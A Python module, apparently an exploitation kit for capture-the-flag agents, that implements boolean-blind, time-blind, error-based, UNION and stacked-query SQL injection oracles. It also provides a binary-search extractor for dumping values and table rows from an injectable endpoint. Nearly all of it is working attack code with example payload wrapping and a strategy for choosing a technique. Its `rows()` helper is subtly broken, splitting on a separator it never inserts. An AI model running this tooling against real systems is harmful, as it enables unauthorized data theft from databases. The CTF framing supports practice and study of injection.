"""SQL injection engines. Write the spec, never the search loop.

A worker's job on a SQLi challenge is to answer three questions about *this*
target:

1. where does the payload go and what wrapping does the syntax need
2. what in the response means TRUE, and what means FALSE
3. what is the expression to pull

Everything after that — calibration, binary search, retry, chunking, parallel
requests — is the same on every target, and this module is where it lives. A
spec is a 10-25 line file; it does not re-implement an extractor.

```python
from kit import Session, BoolOracle, Extractor

s = Session("http://target:8080")

def probe(cond):
    r = s.get("/check", {"id": f"1' AND ({cond}) AND '1'='1"})
    return 'exists":true' in r.text

o = BoolOracle(probe)
o.calibrate()                       # raises unless the oracle can tell 1=1 from 1=2
print(Extractor(o).read("SELECT flag FROM flag LIMIT 1"))
```

**``calibrate()`` is not optional and not a suggestion.** An oracle that
returns ``False`` for everything looks exactly like a target with no data, and
the usual outcome is a confident report of "no injection here" that was
actually a broken predicate. The calibration sends known-TRUE and known-FALSE
conditions; if both give the same answer, every conclusion drawn afterwards is
worthless, and it says so by raising instead of returning an empty string.

The five oracle classes cover the five ways a database can be interrogated:

======================  ============================================
``BoolOracle``          condition → response differs
``TimeOracle``          condition → response is slow
``ErrorOracle``         condition → database error text appears
``UnionOracle``         expression → value is *in* the response
``StackedOracle``       condition → second statement's effect
======================  ============================================

``UnionOracle`` and ``ErrorOracle`` are the cheap ones — they read a whole
value per request. Blind extraction costs roughly 7 requests per character, so
a working UNION path is ~50x faster and is always worth ten minutes of probing
first. That ordering is in ``STRATEGY`` below.
"""

from __future__ import annotations

import re
import statistics
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Callable, Iterable, Sequence

__all__ = [
    "BoolOracle",
    "ErrorOracle",
    "Extractor",
    "OracleError",
    "StackedOracle",
    "TimeOracle",
    "UnionOracle",
    "STRATEGY",
    "PRINTABLE",
    "HEXLIKE",
]

#: Charset used by :meth:`Extractor.read` when binary searching a character.
#: ``HEXLIKE`` is the right default for flags and hashes; ``PRINTABLE`` for
#: text that may contain punctuation and mixed case.
HEXLIKE = "0123456789abcdef"
PRINTABLE = (
    "".join(chr(c) for c in range(0x20, 0x7F))
    + "".join(chr(c) for c in range(0xA0, 0x2FF))
)

#: Tried in order. Each step is dramatically cheaper than the one after it;
#: dropping to blind extraction before ruling out UNION is the single most
#: expensive habit in this whole area.
STRATEGY = """
1. Error-based  — one request per value; check for DB error text in every
                  response you already have before sending anything new.
2. UNION        — one request per value once the column count is known.
3. Boolean blind— ~7 requests per character (log2 of the search space).
4. Time blind   — ~7 requests per character *and* each one costs the delay.
Only the last two need :meth:`Extractor.read`.
"""


class OracleError(RuntimeError):
    """The oracle failed calibration. Do not report a negative after this."""


def _short(value, limit: int = 80) -> str:
    text = repr(value) if not isinstance(value, str) else value
    text = text.replace("\n", "\\n")
    return text if len(text) <= limit else text[:limit] + "…"


class _Base:
    """Retry plus the shared calibration vocabulary."""

    #: A condition that every SQL dialect evaluates to TRUE and one it
    #: evaluates to FALSE, without touching any table. Both are needed: only
    #: the pair proves the oracle distinguishes rather than always answering.
    TRUE_COND = "1=1"
    FALSE_COND = "1=2"

    def __init__(self, probe: Callable[[str], object], *, retries: int = 3) -> None:
        self.probe = probe
        self.retries = retries
        self._calibrated = False
        self.requests = 0

    def _raw(self, cond: str):
        self.requests += 1
        return self.probe(cond)

    def _retry(self, cond: str):
        """Call the probe until it returns something other than ``None``.

        ``None`` is the probe's way of saying "no answer" (transport failure,
        unparseable body). It is never the same as ``False``.
        """
        last = None
        for attempt in range(self.retries + 1):
            last = self._raw(cond)
            if last is not None:
                return last
            if attempt < self.retries:
                time.sleep(0.2 * (2**attempt))
        return None

    def calibrate(self, *, true_cond: str = "", false_cond: str = "") -> "self":
        raise NotImplementedError


class BoolOracle(_Base):
    """Boolean-blind: the response differs depending on whether ``cond`` is true.

    ``probe(cond) -> bool | None``. Return ``None`` — not ``False`` — when the
    request failed; the extractor turns ``None`` into a hard error rather than
    a wrong character.
    """

    def ask(self, cond: str) -> bool | None:
        value = self._retry(cond)
        return None if value is None else bool(value)

    def calibrate(self, *, true_cond: str = "", false_cond: str = "") -> "BoolOracle":
        t_cond = true_cond or self.TRUE_COND
        f_cond = false_cond or self.FALSE_COND
        t = self._retry(t_cond)
        f = self._retry(f_cond)
        if t is None or f is None:
            raise OracleError(
                f"oracle gave no answer during calibration "
                f"({_short(t_cond)}→{_short(t)}, {_short(f_cond)}→{_short(f)}). "
                "The target or the request shape is wrong; nothing downstream is meaningful."
            )
        if bool(t) == bool(f):
            raise OracleError(
                f"oracle cannot distinguish TRUE from FALSE: "
                f"{_short(t_cond)}→{bool(t)}, {_short(f_cond)}→{bool(f)}. "
                "The predicate is not reaching the query, or the TRUE/FALSE test in the "
                "spec matches text that is present either way. Fix the spec's predicate — "
                "do not lower it to a guess."
            )
        self._calibrated = True
        return self


class TimeOracle(_Base):
    """Time-blind: ``cond`` true makes the response slow.

    The spec owns the delay (e.g. ``IF(({cond}),SLEEP(2),0)``) and passes
    ``delay`` so calibration can decide what "slow" means on this network.
    A fixed 200ms threshold is useless against a target whose normal latency
    jitters by 300ms; this measures the FALSE branch instead of assuming it.
    """

    def __init__(
        self,
        probe: Callable[[str], float | None],
        *,
        delay: float = 2.0,
        samples: int = 3,
        retries: int = 2,
    ) -> None:
        super().__init__(probe, retries=retries)
        self.delay = delay
        self.samples = max(1, samples)
        self.baseline: float | None = None
        self.threshold: float | None = None

    def _time(self, cond: str) -> float | None:
        elapsed = self._retry(cond)
        return None if elapsed is None else float(elapsed)

    def calibrate(self, *, true_cond: str = "", false_cond: str = "") -> "TimeOracle":
        t_cond = true_cond or self.TRUE_COND
        f_cond = false_cond or self.FALSE_COND
        slow = self._median(t_cond)
        fast = self._median(f_cond)
        if slow is None or fast is None:
            raise OracleError(
                f"time oracle got no timing during calibration "
                f"(TRUE→{slow}, FALSE→{fast})"
            )
        # Halfway between the two measured branches. If the delay does not
        # show up at all, the payload never reached the DB (or the DB is a
        # dialect without IF/SLEEP) and every later read would be nonsense.
        if slow - fast < self.delay * 0.5:
            raise OracleError(
                f"time oracle sees no delay: TRUE branch {slow:.2f}s vs FALSE "
                f"{fast:.2f}s, expected ≥{self.delay * 0.5:.2f}s apart. The sleep is "
                "not executing — wrong dialect (SLEEP vs pg_sleep vs WAITFOR), wrong "
                "wrapping, or the query is cached."
            )
        self.baseline = fast
        self.threshold = fast + (slow - fast) * 0.5
        self._calibrated = True
        return self

    def _median(self, cond: str) -> float | None:
        times = [self._time(cond) for _ in range(self.samples)]
        times = [t for t in times if t is not None]
        return statistics.median(times) if times else None

    def ask(self, cond: str) -> bool | None:
        if self.threshold is None:
            raise OracleError("TimeOracle.ask() before calibrate()")
        value = self._median(cond)
        return None if value is None else value >= self.threshold


class ErrorOracle(_Base):
    """Error-based: ``probe(cond) -> str`` returns the response body.

    ``pattern`` matches the database error that only appears on the TRUE
    branch. Calibration requires the pattern to fire for TRUE and *not* for
    FALSE — a pattern that fires on both is usually a generic 500 page, and
    against it every condition reads as true.
    """

    def __init__(
        self,
        probe: Callable[[str], str | None],
        *,
        pattern: str = r"(SQL syntax|MySQL|SQLite|PostgreSQL|ORA-\d{5}|XPATH|ODBC)",
        retries: int = 2,
    ) -> None:
        super().__init__(probe, retries=retries)
        self.pattern = re.compile(pattern, re.I)

    def ask(self, cond: str) -> bool | None:
        text = self._retry(cond)
        return None if text is None else bool(self.pattern.search(text))

    def calibrate(self, *, true_cond: str = "", false_cond: str = "") -> "ErrorOracle":
        t_cond = true_cond or self.TRUE_COND
        f_cond = false_cond or self.FALSE_COND
        t = self.ask(t_cond)
        f = self.ask(f_cond)
        if t is None or f is None:
            raise OracleError("error oracle got no response during calibration")
        if not t:
            raise OracleError(
                f"error pattern {self.pattern.pattern!r} does not fire on the TRUE "
                f"branch ({_short(t_cond)}). The payload is not reaching the query, or "
                "the error is suppressed by the app."
            )
        if f:
            raise OracleError(
                f"error pattern fires on the FALSE branch too ({_short(f_cond)}): it is "
                "matching a generic page, so every condition would read as true."
            )
        self._calibrated = True
        return self


class UnionOracle(_Base):
    """UNION-based: ``probe(expr) -> str | None`` returns the page with the value in it.

    The spec's probe wraps a *SQL expression* (not a condition) into the
    injectable and returns the response text. ``value_of`` then picks the
    value out of the page.

    Calibration injects a random literal and requires the same string to come
    back. A wrong column count or wrong position usually still returns 200,
    so without this control an empty extraction is indistinguishable from a
    broken union.
    """

    def __init__(
        self,
        probe: Callable[[str], str | None],
        *,
        value_of: Callable[[str], str] | None = None,
        retries: int = 2,
    ) -> None:
        super().__init__(probe, retries=retries)
        # A callable rather than a compiled pattern because the usual way to
        # read a UNION result out of an HTML page is "the Nth <td>", which a
        # regex can express but not comfortably.
        self.value_of = value_of or (lambda text: text.strip())

    def _value(self, expr: str) -> str | None:
        text = self._retry(expr)
        return None if text is None else self.value_of(text)

    def extract(self, expr: str) -> str | None:
        return self._value(expr)

    def read(self, expr: str) -> str | None:
        """Alias so ``UnionOracle`` can be used anywhere an oracle is expected."""
        return self.extract(expr)

    def calibrate(self, *, marker: str = "sqliCal1b") -> "UnionOracle":
        got = self._value(f"'{marker}'")
        if got is None:
            raise OracleError("union oracle got no response during calibration")
        if marker not in got:
            raise OracleError(
                f"union marker {marker!r} not in the response (got {_short(got)}). "
                "Column count, column order, or the comment terminator is wrong — or the "
                "value is rendered somewhere the spec does not look."
            )
        self._calibrated = True
        return self


class StackedOracle(_Base):
    """Stacked queries: ``probe(cond) -> bool | None`` where the TRUE branch runs
    a second statement whose effect is visible (a row appears, a counter moves).

    Mechanically identical to :class:`BoolOracle`; it exists as its own class
    only so the spec says out loud that it is stacking queries, which needs
    ``;`` support and usually a driver other than the default prepared one.
    """

    def __init__(self, probe: Callable[[str], bool | None], *, retries: int = 3) -> None:
        super().__init__(probe, retries=retries)

    ask = BoolOracle.ask
    calibrate = BoolOracle.calibrate


class Extractor:
    """Binary-search extraction over any boolean-shaped oracle.

    ``ask(cond) -> bool`` is the only requirement, so this works for
    :class:`BoolOracle`, :class:`TimeOracle`, :class:`ErrorOracle` and
    :class:`StackedOracle` alike.

    Raises :class:`OracleError` on an unanswered request instead of returning
    a placeholder. A silent ``'?'`` for a failed read produces a flag-shaped
    string that is wrong in one character, which is worse than a crash: it
    gets submitted and it gets reported.
    """

    def __init__(
        self,
        oracle: _Base,
        *,
        charset: str = PRINTABLE,
        workers: int = 1,
        max_length: int = 512,
        require_calibration: bool = True,
    ) -> None:
        self.oracle = oracle
        self.charset = charset
        self.workers = max(1, workers)
        self.max_length = max_length
        if require_calibration and not getattr(oracle, "_calibrated", False):
            raise OracleError(
                "Extractor refuses an uncalibrated oracle. Call oracle.calibrate() "
                "first — an extractor pointed at a dead predicate returns a plausible-"
                "looking wrong answer, which is the one failure mode worth crashing on."
            )

    # -- primitives --------------------------------------------------------
    def ask(self, cond: str) -> bool:
        value = self.oracle.ask(cond)
        if value is None:
            raise OracleError(f"no answer for condition: {_short(cond, 120)}")
        return bool(value)

    def length(self, expr: str) -> int:
        """Character length of ``expr``, or ``0`` for NULL/empty.

        ``LENGTH(NULL)`` is NULL, not 0, so ``LENGTH(x) > 0`` is NULL for a
        missing row and the bisection would silently return 0. The explicit
        ``IS NOT NULL`` probe separates "the row has no value" from "the
        expression is wrong" — the second one must not read as an empty flag.
        """
        if not self.ask(f"({expr}) IS NOT NULL"):
            # Could be NULL, could be "the subquery returns no rows at all".
            # Either way there is nothing to read; say so rather than guess.
            return 0
        hi = self.max_length
        if not self.ask(f"LENGTH(({expr})) > 0"):
            return 0
        lo = 1
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.ask(f"LENGTH(({expr})) >= {mid}"):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def char_at(self, expr: str, pos: int) -> str:
        """The character at 1-based ``pos``, by bisecting the charset.

        Bisects the *index into the charset* rather than the code point: the
        order of ``charset`` is what defines "greater", so a charset of hex
        digits searches 4 levels instead of 7, and a charset of
        ``0123456789abcdef`` also rejects uppercase near-misses outright.
        """
        cs = self.charset
        lo, hi = 0, len(cs) - 1
        while lo < hi:
            mid = (lo + hi) // 2
            # `IN (...)` over the lower half is portable across dialects and
            # reads better in a WAF log than a chain of ORs.
            lower = ",".join(f"'{c}'" for c in cs[lo : mid + 1] if c != "'")
            if self.ask(f"SUBSTR(({expr}),{pos},1) IN ({lower})"):
                hi = mid
            else:
                lo = mid + 1
        return cs[lo]

    # -- bulk --------------------------------------------------------------
    def read(self, expr: str, length: int | None = None) -> str:
        """Extract ``expr`` in full."""
        n = self.length(expr) if length is None else length
        if n <= 0:
            return ""
        if self.workers == 1:
            return "".join(self.char_at(expr, i) for i in range(1, n + 1))
        with ThreadPoolExecutor(max_workers=self.workers) as pool:
            parts = list(pool.map(lambda i: self.char_at(expr, i), range(1, n + 1)))
        return "".join(parts)

    def read_many(self, exprs: Sequence[str]) -> dict[str, str]:
        """Extract several expressions, sharing the oracle."""
        return {expr: self.read(expr) for expr in exprs}

    def rows(self, table: str, columns: Sequence[str], *, limit: int = 20) -> list[list[str]]:
        """Dump rows the slow-but-universal way: joined per row, split on a separator.

        Works on any dialect that has ``LIMIT``/``ROWNUM`` via the caller's
        expression. Kept deliberately simple: if the injection allows UNION,
        the caller should use :class:`UnionOracle` and never call this.
        """
        cols = ",".join(columns)
        out: list[list[str]] = []
        for index in range(limit):
            row = self.read(f"SELECT {cols} FROM {table} LIMIT 1 OFFSET {index}")
            if not row:
                break
            out.append(row.split("\x1f"))
        return out


def check_all(oracles: Iterable[tuple[str, _Base]]) -> dict[str, str]:
    """Calibrate several candidate oracles, reporting each one's outcome.

    Used while probing a target: run every oracle the challenge could
    plausibly support and pick the cheapest that calibrates. A failed
    calibration is a *result* here, so it is collected rather than raised.
    """
    results: dict[str, str] = {}
    for name, oracle in oracles:
        try:
            oracle.calibrate()
            results[name] = "ok"
        except OracleError as exc:
            results[name] = f"fail: {exc}"
    return results
